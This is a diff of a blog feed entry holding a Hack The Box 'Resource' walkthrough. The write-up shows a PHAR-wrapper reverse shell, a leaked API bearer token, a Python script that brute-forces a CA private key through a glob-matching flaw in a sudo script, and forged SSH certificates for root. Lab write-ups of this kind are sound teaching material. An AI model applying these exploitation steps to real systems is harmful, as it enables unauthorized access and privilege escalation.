@@ -15,7 +15,7 @@
             <pubDate>Fri, 22 Nov 2024 18:48:22 -0600</pubDate>
             
             <guid>https://scorpiosec.com/posts/2024/11/htb-resource/</guid>
-            <description>Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH vulnerabilities. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user. After gaining access to a different host, we escalate our privileges by exploiting a glob injection vulnerability in a bash script, ultimately gaining root access.</description>
+            <description>Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user.</description>
             <content type="html"><![CDATA[<ul>
 <li>Platform: Hack The Box</li>
 <li>Link: <a href="https://app.hackthebox.com/machines/Resource" target="_blank" >Resource</a>
@@ -25,7 +25,7 @@
 <li>OS: Linux</li>
 </ul>
 <hr>
-<p>Resource revolves around exploiting SSH vulnerabilities. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user. After gaining access to a different host, we escalate our privileges by exploiting a glob injection vulnerability in a bash script, ultimately gaining root access.</p>
+<p>Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user. After gaining access to a different host, we escalate our privileges by exploiting a glob injection vulnerability in a bash script, ultimately gaining root access.</p>
 <p>Target IP address - <code>10.10.11.27</code></p>
 <h2 id="scanning">Scanning</h2>
 <pre tabindex="0"><code>./nmap_scan.sh 10.10.11.27 Resource
@@ -85,7 +85,7 @@
 
 .</p>
 <blockquote>
-<p>When we create a <code>.zip</code> archive containing the <code>revshell.php</code> file and access it using the <code>phar://</code> stream wrapper, PHP treats the <code>.zip</code> as a PHAR-compatible archive. The <code>phar://</code> protocol allows PHP to directly access files within the archive, including executable PHP scripts. When the URL <code>http://itrc.ssg.htb/?page=phar://uploads/.../revshell</code> is processed, the server executes the <code>revshell.php</code> file within the archive as PHP code, triggering the reverse shell. This works because the server uses an insecure file inclusion mechanism (<code>include</code>, <code>require</code>, or similar) without properly validating or restricting the file path, allowing code execution through the <code>phar://</code> wrapper.</p>
+<p>When we create a <code>.zip</code> archive containing the <code>revshell.php</code> file and access it using the <code>phar://</code> stream wrapper, PHP treats the <code>.zip</code> file as a PHAR-compatible archive. The <code>phar://</code> protocol allows PHP to directly access files within the archive, including executable PHP scripts. When the URL <code>http://itrc.ssg.htb/?page=phar://uploads/.../revshell</code> is processed, the server executes the <code>revshell.php</code> file within the archive as PHP code, triggering the reverse shell. This works because the server uses an insecure file inclusion mechanism (<code>include</code>, <code>require</code>, or similar) without properly validating or restricting the file path, allowing code execution through the <code>phar://</code> wrapper.</p>
 </blockquote>
 <p>Using <code>http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell</code> we successfully trigger the reverse shell. We obtain a connection on our listener as <code>www-data</code> and we are in <code>/var/www/itrc</code>.</p>
 <p><img src="/images/HTB-Resource/phar_revshell.png" alt="phar reverse shell"></p>
@@ -177,7 +177,7 @@
 </table>
 <p><img src="/images/HTB-Resource/zzinter_SSH_certificate.png" alt="zzinter SSH certificate"></p>
 <ol start="3">
-<li>Login using the SSH certificate.</li>
+<li>Login using the SSH key.</li>
 </ol>
 <pre tabindex="0"><code>ssh -i id_rsa_zzinter zzinter@itrc.ssg.htb
 </code></pre><p><img src="/images/HTB-Resource/zzinter_login.png" alt="zzinter SSH login"></p>
@@ -229,7 +229,7 @@ ssh -i id_rsa_root root@itrc.ssg.htb
 <h3 id="lateral-movement-support-shell-on-ssg-host">Lateral movement (support shell on ssg host)</h3>
 <p>The script contains a list of supported principals, so let&rsquo;s use one of them.</p>
 <ol>
-<li>Generate an SSH key for support.</li>
+<li>Generate an SSH key for <code>support</code>.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -t rsa -b 4096 -f id_rsa_support
 </code></pre><ol start="2">
@@ -256,7 +256,7 @@ chmod 600 id_rsa_support-cert.pub
 <p>We will repeat the same process and login as <code>zzinter</code> on the new host. The issue here is that we cannot generate a signed certificate by using the script because <code>zzinter</code> is not a supported principal.</p>
 <p>Examining the script again we see that it uses <code>curl</code> to fetch the SSH certificate, it expects three things: a public_key, a username, and some principal(s). Currently we lack a valid principal name.</p>
 <pre tabindex="0"><code>curl -s signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;&#39;&#34;$public_key&#34;&#39;&#34;, &#34;username&#34;: &#34;&#39;&#34;$username&#34;&#39;&#34;, &#34;principals&#34;: &#34;&#39;&#34;$principal&#34;&#39;&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
-</code></pre><p>The content of <code>sshd_config.d/sshcerts.conf</code> shows us that a principal file located at <code>/etc/ssh/auth_principals</code> is used by SSH on this host. Checking the file we find <code>zzinter_temp</code> to be a valid principal namae for <code>zzinter</code>.</p>
+</code></pre><p>The content of <code>/etc/ssh/sshd_config.d/sshcerts.conf</code> shows us that a principal file located at <code>/etc/ssh/auth_principals</code> is used by SSH on this host. Checking the file we find <code>zzinter_temp</code> to be a valid principal namae for <code>zzinter</code>.</p>
 <p><img src="/images/HTB-Resource/principal_file.png" alt="SSH principal file"></p>
 <p><img src="/images/HTB-Resource/zzinter_temp.png" alt="zzinter valid principal name"></p>
 <p>With all the required elements we can now repeat the process used earlier.</p>
@@ -285,7 +285,7 @@ chmod 600 id_rsa_zzinter-cert.pub
 <h2 id="privilege-escalation-root-shell-on-ssg-host">Privilege Escalation (root shell on ssg host)</h2>
 <p>The home folder of <code>zzinter</code> only contains the user flag, but running <code>sudo -l</code> we learn that this user can execute <code>/opt/sign_key.sh</code> as root without providing a password.</p>
 <p><img src="/images/HTB-Resource/sudo-l-cmd.png" alt="sudo -l command"></p>
-<p>The output of <code>sign_key.sh</code> is as below. The script is similar to the <code>sign_key_api.sh</code> script, it use <code>ssh-keygen</code> to sign an SSH public key using a specified CA private key to create a signed SSH certificate. It expects five arguments and also performs a matching operation with the <code>/etc/ssh/ca-it</code>.</p>
+<p>The output of <code>sign_key.sh</code> is as below. The script is similar to the <code>sign_key_api.sh</code> script, it uses <code>ssh-keygen</code> to sign an SSH public key using a specified CA private key to create a signed SSH certificate. It expects five arguments and also performs a matching operation with the <code>/etc/ssh/ca-it</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>usage <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
@@ -348,13 +348,10 @@ chmod 600 id_rsa_zzinter-cert.pub
 </blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Characters to test in brute-forcing (alphanumeric + special characters)</span>
 </span></span><span style="display:flex;"><span>charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> &#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize discovered CA content with known starting format of SSH keys</span>
 </span></span><span style="display:flex;"><span>discovered_ca <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-----BEGIN OPENSSH PRIVATE KEY-----</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use a more fitting name for the temporary CA file</span>
 </span></span><span style="display:flex;"><span>temp_ca_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;temp_ca_guess&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
@@ -366,14 +363,12 @@ chmod 600 id_rsa_zzinter-cert.pub
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(temp_ca_file, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
 </span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(current_guess)
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Run the vulnerable script</span>
 </span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
 </span></span><span style="display:flex;"><span>            [<span style="color:#e6db74">&#34;sudo&#34;</span>, <span style="color:#e6db74">&#34;/opt/sign_key.sh&#34;</span>, temp_ca_file, <span style="color:#e6db74">&#34;test.pub&#34;</span>, <span style="color:#e6db74">&#34;root&#34;</span>, <span style="color:#e6db74">&#34;root_user&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>],
 </span></span><span style="display:flex;"><span>            stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
 </span></span><span style="display:flex;"><span>            text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
 </span></span><span style="display:flex;"><span>        )
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check the output for feedback</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Use API for signing with this CA&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>stdout:
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Correct character found, append to discovered_ca</span>
 </span></span><span style="display:flex;"><span>            discovered_ca <span style="color:#f92672">+=</span> char
@@ -381,9 +376,7 @@ chmod 600 id_rsa_zzinter-cert.pub
 </span></span><span style="display:flex;"><span>            found_character <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>  <span style="color:#75715e"># Break inner loop to continue building the CA string</span>
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If no new character is found, the CA file content is fully discovered</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found_character:
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check for closing marker</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;-----END OPENSSH PRIVATE KEY-----&#34;</span> <span style="color:#f92672">in</span> discovered_ca:
 </span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Full CA content discovered:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>discovered_ca<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
@@ -415,11 +408,48 @@ QBAgM=
 <li>Create a SSH certificate by signing the public key.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -s root.key -z 200 -I root -V -52w:forever -n root_user root.pub
-</code></pre><ol start="4">
+</code></pre><table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-s root.key</td>
+<td>Specifies the signing key, which is the private key of the Certificate Authority (CA).</td>
+</tr>
+<tr>
+<td>-z 200</td>
+<td>Specifies the certificate serial number. This is a unique identifier for the certificate.</td>
+</tr>
+<tr>
+<td>-I root</td>
+<td>Specifies the key identity string. The identity (<code>root</code>) is an arbitrary label for the certificate.</td>
+</tr>
+<tr>
+<td>-V -52w:forever</td>
+<td>Specifies the validity period.</td>
+</tr>
+<tr>
+<td>-n root_user</td>
+<td>Specifies the authorized principals (usernames or roles).</td>
+</tr>
+<tr>
+<td>root.pub</td>
+<td>Specifies the public key file being signed. The certificate will be generated for this key, and the resulting file will be named <code>root-cert.pub</code>.</td>
+</tr>
+</tbody>
+</table>
+<ol start="4">
 <li>Login as root</li>
 </ol>
 <pre tabindex="0"><code>ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub
-</code></pre><p><img src="/images/HTB-Resource/root_flag.png" alt="root ssh login and flag"></p>
+</code></pre><blockquote>
+<p>The private key (<code>root</code>) provides proof of ownership, while the certificate (<code>root-cert.pub</code>) establishes trust between our key and the server. The server validates the certificate using the CA public key stored in its configuration (from <code>TrustedUserCAKeys</code>), and then uses the private key to complete the authentication process. The certificate tells the server to trust the public key in <code>root.pub</code> because it was signed by the trusted Certificate Authority (CA). Without the certificate, the server wouldn’t recognize the root key as a trusted identity.</p>
+</blockquote>
+<p><img src="/images/HTB-Resource/root_flag.png" alt="root ssh login and flag"></p>
 <p>Thanks for reading this write up!</p>
 ]]></content>
         </item>
